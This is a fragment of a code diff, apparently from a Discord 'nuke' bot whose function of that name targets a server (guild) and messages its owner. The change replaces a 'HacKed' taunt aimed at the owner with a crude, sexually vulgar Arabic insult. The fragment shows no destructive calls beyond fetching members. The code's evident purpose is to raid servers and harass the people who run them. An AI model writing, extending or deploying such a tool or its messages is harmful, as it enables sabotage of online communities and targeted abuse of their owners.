@@ -433,7 +433,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' HacKed سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send('خلي سلطان يفك طيزك :kissing_heart::kissing_heart:.').catch(e => { return void e; });
  
  
  
@@ -490,6 +490,7 @@ LOka.on('guildMemberAdd', member => {
     });
  
    
+ 
  
  
  
